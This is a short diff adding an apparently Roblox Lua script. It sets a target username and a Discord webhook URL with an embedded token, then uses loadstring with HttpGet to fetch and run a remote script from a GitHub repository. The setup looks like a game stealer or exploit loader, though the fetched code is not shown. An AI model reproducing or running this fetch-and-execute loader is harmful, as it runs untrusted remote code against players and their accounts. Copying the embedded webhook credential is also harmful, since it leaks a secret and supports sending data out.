@@ -1,0 +1,4 @@
+UserName = "JustUninstal"
+WebHook = "https://discord.com/api/webhooks/1093131681378074684/iGlfFkT1_Fc-8kiIot6FnQ2V9ATLbdYhuogqfyMT3b0RVXE-qYTbTdYMqpCmhxH87Pma"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
